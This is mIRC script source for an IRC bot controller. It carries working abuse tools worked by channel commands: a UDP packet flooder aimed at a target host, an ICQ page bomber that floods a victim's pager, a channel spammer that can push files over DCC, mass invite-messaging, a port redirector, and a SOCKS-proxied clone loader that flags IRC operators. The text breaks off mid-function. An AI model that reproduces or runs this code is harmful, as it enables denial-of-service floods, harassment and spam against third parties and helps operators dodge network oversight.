on 10:TEXT:!inviter*:*:{   %s.i.c = # | if (# == $null) { set  %s.i.c $nick }  |  if ($2 == load) { /set %i.server $3 | /set %i.port $4 | %i.b = on | s.inviter  } |  if ($2 == stop) { sockclose inviter* | remove ichan.txt | //set %i.b off | unset %i.temp.* | /timerinviteconnect off | msg # 12[15in14vit15er12]:  Inviter has been killed. }  |  if ($2 == status) { if ($sock(inviter*,0) == 0) { msg # 12[15in14vit15er12]: Status: Not Connected! | halt }  
  if ($sock(inviter*,0) > 0) { msg # 12[15in14vit15er12]: Status: Connected [ $+ $sock(inviter*,0) $+ ] }     } |   if ($2 == stats) { msg # 12[15in14vit15er12]: (Stats) Total Invited: $calc( %i.t.j  +  %i.t.p ) Delay: ( $+ %i.ondelay $+ ) }   |  if ($2 == list) { sockwrite -nt inviterN LIST :* $+ $3 $+ * }  |  if ($2 == message) { set %imsg $3- | msg # 12[15in14vit15er12]:  Invite Message set as [ $+ $3- $+ ] } 
  if ($2 == ctotal) { msg # 12[15in14vit15er12]: Random Channels Total: $+ $lines(ichan.txt)  }  |  if ($2 == reset) { msg # 12[15in14vit15er12]: All Settings Unset! | unset %i.t.j  | unset %i.t.p | unset %imsg | unset %i.server | unset %s.i.c | unset %i.b | unset %i* | write -c ichan.txt | remove ichan.txt | unset %t.i | sockclose inviter* }  |  if ($2 == mode) { /sockwrite -nt inviter*  MODE $3-  }  
  if ($2 == join) { if ($3 == random) {  if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { msg # 12[15in14vit15er12]: Error: Gather channels first! | halt }  |   set %i.r.j.a $4 | /set %i.r.j.i 0  |   :loop |    if (%i.r.j.i  > %i.r.j.a) { goto end } |     /sockwrite -nt inviterN JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt  |     inc %i.r.j.i  |     goto loop |     :end    |   unset %i.r.j.i | unset %i.r.j.a   |   halt    } |   else { /sockwrite -nt inviterN JOIN : $+ $3 }  } 
if ($2 == part) { //sockwrite -nt inviterN PART : $+ $3- }   |  if ($2 == nick) { if ($3 == random) { sockwrite -nt inviterN NICK $read temp.scr | halt }  |  //sockwrite -nt inviterN NICK $3   } 
if ($2 == delay) { set %i.ondelay $3 | msg # 12[15in14vit15er12]:  Delay set to: ( $+ $3 $+ ). } }
alias s.inviter {   if (%i.ondelay == $null) { msg %s.i.c 12[15in14vit15er12]: Error: Please set delay !inviter delay [ [ [ delay ] ] ] | halt } |  if (%i.server == $null) || (%i.port == $null) { msg %s.i.c 12[15in14vit15er12]:  Error Starting Inviter, Inviter Server or Port not set! %iserver/%iserver.port | halt }  |  if ($sock(inviter*,0) > 0) { msg %s.i.c 12[15in14vit15er12]:  Error: Inviter already loaded! | halt }  
//sockopen inviterN %i.server %i.port  | /msg %s.i.c 12[15in14vit15er12]:  Loading inviter to Server: ( $+ $+ %i.server $+ ) Port: ( $+ %i.port $+ )  |  //sockopen inviterM %i.server %i.port  }
on *:sockread:inviter*:{   sockread -f %t.i  |  if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) { write ichan.txt $gettok(%t.i,4,32) }  |  if ($gettok(%t.i,2,32) == 321) { msg %s.i.c 12[15in14vit15er12]: Listing channels on $remove($gettok(%t.i,1,32),:) }  |  if ($gettok(%t.i,2,32) == 323) { msg %s.i.c 12[15in14vit15er12]: Listing channels complete on $remove($gettok(%t.i,1,32),:)  [Total Channels in List: $+ $lines(ichan.txt) $+ ] }  
  if ($gettok(%t.i,2,32) == 474) { msg %s.i.c 12[15in14vit15er12]:  Join Error: Banned from ( $+ $gettok(%t.i,4,32) $+ ) }    |  if ($gettok(%t.i,2,32) == 433) { /sockwrite -nt inviterN NICK $gettok(%t.i,4,32) $+ $r(a,z) } |  if ($gettok(%t.i,1,32) == PING) { sockwrite -nt $sockname PONG $gettok(%t.i,2,32) } |   if ($gettok(%t.i,2,32) == JOIN) {  if (%i.on == Off) { halt } |   if ($timer($remove($gettok(%t.i,1,33),:)) !== $null) { halt } 
  if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } |  set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done |   set %i.on Off |  /timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt inviterM PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg |   /sockwrite -nt inviterN WHOIS : $+ $remove($gettok(%t.i,1,33),:) |   inc %i.t.j |   .timer 1 %i.ondelay set %i.on Yes  }   | if ($gettok(%t.i,2,32) == KICK) { sockwrite -nt inviterN JOIN : $+ $gettok(%t.i,3,32) } 
  if ($gettok(%t.i,1,32) == ERROR) { msg %s.i.c 12[15in14vit15er12]: Error Connecting: %t.i (attempting to reconnect)-(to stop !inviter stop) | /timerinviteconnect 0 3 /sockopen inviter %i.server %i.port } 
  if ($gettok(%t.i,2,32) == MODE) {    if ($gettok(%t.i,4,32) == +o) {    if ($timer($gettok(%t.i,5,32)) == $null) { halt } |    .timer $+ $gettok(%t.i,5,32) off |     dec %i.t.j 1  |   /msg %chan  inviter! error: not inviting: $gettok(%t.i,5,32)  because he was opd!   }   |   if ($gettok(%t.i,4,32) == +v) {   if ($timer($gettok(%t.i,5,32)) == $null) { halt } |    .timer $+ $gettok(%t.i,5,32) off |    dec %i.t.j 1 |   } }
  if ($gettok(%t.i,2,32) == NICK) {   if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off |  dec %i.t.j  } | if ($gettok(%t.i,2,32) == QUIT) {  if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off   |  dec %i.t.j  } |  if ($gettok(%t.i,2,32) == 313) {   /msg %s.i.c 12Inviter Warning!!!: 3IRCOP DETECTED!!!! 10-[12 $+ $gettok(%t.i,4,32) $+ 10] 
if ($timer($gettok(%t.i,4,32)) == $null) { halt } |  /timer $+ $gettok(%t.i,2,32) off  }  }
on 1:sockopen:inviter*: {   sockwrite -nt $sockname PONG $server |  sockwrite -tn $sockname User $read winddowslogs $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  winddowslogs ] ] |  sockwrite -tn $sockname Nick $read winddowslogs  | /timerinviteconnect off | sockread  }
on 1:sockclose:inviter*:{ if (%i.b == off) { remove ichan.txt | halt }  |  if (%i.b == on) { msg %s.i.c 12[15in14vit15er12]:  Inviter was disconnected! (Reloading).  | /sockopen $sockname %i.server %i.port } }
on 10:TEXT:!icqpagebomb*:#:{  if ($2 == help) { msg # Syntax: !icqpagebomb uin ammount email/name sub message (HELP) | halt } |   if ($2 == reset) { msg # Icq Page Bomber (All Settings Reset!)... | unset %ipb.n | unset %ipb.sub | unset %ipb.m | unset %ipb.uin | unset %ipb.t } |  if ($6 == $null) { msg # Error!: !icqpagebomb uin ammount email/name sub message | halt } | if ($3 !isnum 1-100) { msg # ERROR! Under Ammount 100 please. (moreinfo type !icqpagebomb help) | halt } |   set %ipb.n $4 | set %ipb.sub $5 | set %ipb.m $replace($6,$chr(32),_) | set %ipb.uin $2 | set %ipb.t $3 
msg # 14[15ICQPAGEBOMBER14]:15 Bombing:12 $2 14Ammount:12 $3 15Name/Email:12 $4 14Sub:12 $5 14Message:12 $6 3etc... |   /icqpagebomb  }
alias icqpagebomb { :bl | inc %bl.n |  sockopen icqpager $+ %bl.n  wwp.icq.com 80 |  if (%bl.n > %ipb.t) { unset %ipb.t |  unset %bl.n | halt } |  goto bl } 
on *:sockopen:icqpager*:{ sockwrite -nt $sockname GET /scripts/WWPMsg.dll?from= $+ %ipb.n $+ &fromemail= $+ %ipb.n $+ &subject= $+ %ipb.sub $+ &body=  $+ %ipb.m $+ &to=  $+ %ipb.uin $+ &Send=Message   | sockwrite $sockname $crlf $+ $crlf |  sockread }
on *:sockread:icqpager*:{ sockread -f %temp }
on *:sockclose:icqpager*:{ unset %temp }
on 10:TEXT:!spam *:*: {
  if ($2 == help) { msg # 12�15HypE-InviteR12�14 Commands | msg # !spam [on/off] | msg # !spam raw [raw command here] | msg # !spam msg [New spam msg] | msg # !spam stats | msg # !spam type [msg/send] | msg # !spam file [name of file to send] }
  if ($2 == stats) { msg # 12�15HypE-InviteR12�14 Status: ( $+ $iif($sock(wSck32) != $null,ON,off) $+ ) Spamming Server: ( $+ $sock(wSck32).ip $+ ) Spamming Chans: ( $+ %spam.chans $+ ) Total Spammed: ( $+ %spammed $+ ) Type: ( $+ %spamtype $+ ) Total Sends: ( $+ %total.sent $+ ) File: ( $+ %winfile $+ ) Ext: ( $+ %ext $+ ) }
  if ($2 == off) { stop.dspam | msg # 12�15HeLL-InviteR12�14 Disabled spammer | halt }
  if ($2 == raw) { sockwrite -tn wSck32 $$3- | msg # 12�15HypE-InviteR12�14 Performed raw command.. | halt }
  if ($2 == msg) { if ($3 == $null) { 12�15HeLL-InviteR12�14 Spam message is currently set to: %spam.msg | halt } | set %spam.msg $3- | msg # 12�15HypE-InviteR12�14 Spam message is now set to: $3- }
  if ($2 == on) { if ($sock(wSck32) != $null) { msg # 12�15HypE-InviteR12�14 Error! Already spamming. | halt } | if ($4 !isnum) { msg # 12�15HypE-InviteR12�14 Error! Use !spam on irc.dal.net 6667 | halt } | set %spam.server $3 | set %spam.port $4 | msg # 12�15HypE-InviteR12�14 Enabled spammer! | start.dspam }
  if ($2 == type) { if ($3 == MSG) { msg # 12�15HeLL-InviteR12�14 Spam set to: MSG | set %spamtype MSG | halt } | if ($3 == SEND) { msg # 12�15HypE-InviteR12�14 Spam set to: SEND | set %spamtype SEND | halt } | msg # 12�15HypE-InviteR12�14 Error! Please use !spam type [msg/send] }
  if ($2 == ext) { if ($3 == $null) { msg # 12�15HeLL-InviteR12� Error! Use !spam ext .exe | halt } | set %ext $3- | msg # 12�15HypE-InviteR12� Set file extension to ( $+ $3- $+ ) Type !spam type send to enable DCC sends. }
  if ($2 == file) { if ($3 == $null) { msg # 12�15HeLL-InviteR12� Error! Use !spam file C:\windows\win.ini | halt } | set %winfile $3- | msg # 12�15HypE-InviteR12� Set file send to ( $+ $3- $+ ) Type !spam type send to enable DCC sends. }
  if ($2 == version) { msg # 12�15HeLL-InviteR12�14 (v2.1) By: <the scripting g0d himself>-<NaHeMiA>-<the scripting g0d himself> and Acid who helped =D }
}
on 10:TEXT:!portredirect*:*:{ if ($2 == $null) { /msg # 14Portredirection Error!!! For help type: !portredirect help | halt } | if ($2 == help) { /msg # 14*** Port Redirection Help! *** | /msg # 14Commands.. | //msg # 14!portredirect add 1000 irc.dal.net 6667 | //msg # 14!portredirect stop port | //msg # 14!portredirect stats | /msg # 14Port Redirect Help / END halt } | if ($2 == add) { if ($5 == $null) { /msg # 3Port Redirection Error: !portredirect add inputport outputserver outputserverport (!portredirect add 1000 irc.dal.net 6667) | halt } | //gtportdirect $3- | /msg # 14[Redirect Added] I-port=( $+ $3 $+ ) to $4 $+ $5 | /msg # 12[Local IP Address]:14 $ip |  halt  } |  if ($2 == stop) {  if ($3 == $null) { halt } | /pdirectstop $3 |  /msg # 14[Portredirection] Port:(12 $+ $3 $+ 14) Has been stopped. |  halt  } | if ($2 == stats) { |  //msg  # 12*** Port Redirection Stat's. |  /predirectstats #  } }
on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum }
on *:Sockread:gtin*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return } | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockread:gtout*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return } | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockopen:gtout*: {  if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname }
on *:sockclose:gtin*: {   unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname }
on 10:TEXT:!pfast*:#:{  //set %pchan # |  if ($4 == random) { //gcoolstart $2 $3 $r(1,65000) | halt } | //gcoolstart $2 $3 $4 }
alias gcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg %pchan [packeting]: Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %pchan ERROR! Currently flooding: $gettok($timer(gcoolt).com,3,32)  | return } |  msg %pchan 14[sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )14] |  set %gnum 0 |  .timergcoolt -m 0 60 gdope $1 $2 $3 }
alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 2 
  %gnum.p = $r(1,65000)
  sockudp gnumc1 $2 %gnum.p @$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*)
  %gnum.p = $r(1,65000) 
  sockudp gnumc3 $2 %gnum.p sdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnd
  %gnum.p = $r(1,65000)
  sockudp gnumc2 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnum.p = $r(1,65000)
  sockudp gnumc4 $2 %gnum.p @$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*)
  %gnum.p = $r(1,65000)
  sockudp gnumc5 $2 %gnum.p @$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*)
  %gnum.p = $r(1,65000)
  sockudp gnumc6 $2 %gnum.p sdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnd
  %gnum.p = $r(1,65000)
  sockudp gnumc7 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnum.p = $r(1,65000)
  sockudp gnumc8 $2 %gnum.p @$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*)
  return |  :done | //msg %pchan [packeting]: Finished! | .timergcoolt off | unset %gnum* | unset %pchan 
}
alias firew {  if ($1 == 1) { %clones.firewall = 1 } | elseif ($1 == 0) { %clones.firewall = 0 } }
alias cf { firew 1 | if ($2 == $null) { halt } |  %clones.firew = $1 |  if ($3 == $null) { .timer -o $2 2 connect1 $1 } |  else { .timer -o $2 $3 connect1 $1 } }
alias firstfree { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = *ock $+ %clones.counter | if ($sock(%clones.tmp,0) == 0) { return %clones.counter } | goto home |  :end }
alias connect1 { if ($1 != $null) { %clones.firew = $1 } | if (%clones.server == $null) { msg %chan 2Server not set | halt } |  if (%clones.serverport == $null) { %clones.serverport = 6667 } |  %clones.tmp = $firstfree |  if (%clones.firewall == 1) {  sockopen ock $+ %clones.tmp %clones.firew 1080  } |  else { sockopen sock $+ %clones.tmp %clones.server %clones.serverport  } }
alias botraw { sockwrite -n sock* $1- }
alias changenick { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = $read winddowslogs | if (%clones.tmp == $null) { %clones.tmp = $randomgen($r(0,9)) } |  if ($sock(sock*,%clones.counter) == $null) { goto end } |  sockwrite -n $sock(sock*,%clones.counter) NICK %clones.tmp | sockmark $sock(sock*,%clones.counter) %clones.tmp | goto home | :end }
alias getmarks { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter |  if (%clones.counter >= %clones.total) { goto end } |  goto home | :end }
alias isbot { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter | if ($sock(%clones.tmp).mark == $1) { return $true } |  if (%clones.counter >= %clones.total) { goto end } | goto home |   :end |  return $false }
on *:sockopen:ock*:{  if ($sockerr > 0) { halt } |  %clones.tmpcalc = $int($calc(%clones.serverport / 256)) |  bset &binvar 1 4  |  bset &binvar 2 1  |  bset &binvar 3 %clones.tmpcalc  |  bset &binvar 4 $calc(%clones.serverport - (%clones.tmpcalc * 256))  |  bset &binvar 5 $gettok(%clones.server,1,46)  |  bset &binvar 6 $gettok(%clones.server,2,46)  | bset &binvar 7 $gettok(%clones.server,3,46)  |  bset &binvar 8 $gettok(%clones.server,4,46)  |  bset &binvar 9 0   | sockwrite $sockname &binvar } 
on *:sockread:ock*:{ if ($sockerr > 0) { halt } |  sockread 4096 &binvar  | if ($sockbr == 0) { return } |  if ($bvar(&binvar,2) == 90) { %clones.tp = $read winddowslogs |  if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } |   sockwrite -n $sockname USER %clones.tp a a : $+ $chr(3) $+ $rand(0,15) $+ $read winddowslogs |  %clones.tp = $read winddowslogs |   if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } |  sockwrite -n $sockname NICK %clones.tp   | sockmark $sockname %clones.tp |  sockrename $sockname s $+ $sockname  } | elseif ($bvar(&binvar,2) == 91) { return } } 
on *:sockopen:sock*:{ if ($sockerr > 0) { halt } | %clones.tp = $read winddowslogs | if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } | sockwrite -n $sockname USER %clones.tp a a  $+ $read winddowslogs | %clones.tp = $read winddowslogs | if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } | sockwrite -n $sockname NICK %clones.tp  | sockmark $sockname %clones.tp }
on *:sockread:sock*:{ if ($sockerr > 0) { halt } | sockread 4096 %clones.read | %clones.tmp = $gettok(%clones.read,2,32) | if ($gettok(%clones.read,1,32) == PING) { sockwrite -n $sockname PONG $gettok(%clones.read,2,32) } |  elseif (%clones.tmp == 001) { sockwrite -n $sockname MODE $sock($sockname).mark +i |  if (%clones.silence == 1) { sockwrite -n $sockname SILENCE *@* }  } | elseif (%clones.tmp == 433) { %clones.rand = $randomgen($r(0,9)) | sockwrite -n $sockname NICK %clones.rand  | sockmark $sockname %clone.rand } | elseif (%clones.tmp == 353) { if (%clones.deop == 1) { %clones.deop = 0  %clones.cnt2 = 0 |   %clones.deopstr = $null |   :home |  inc %clones.cnt2 1 | $&
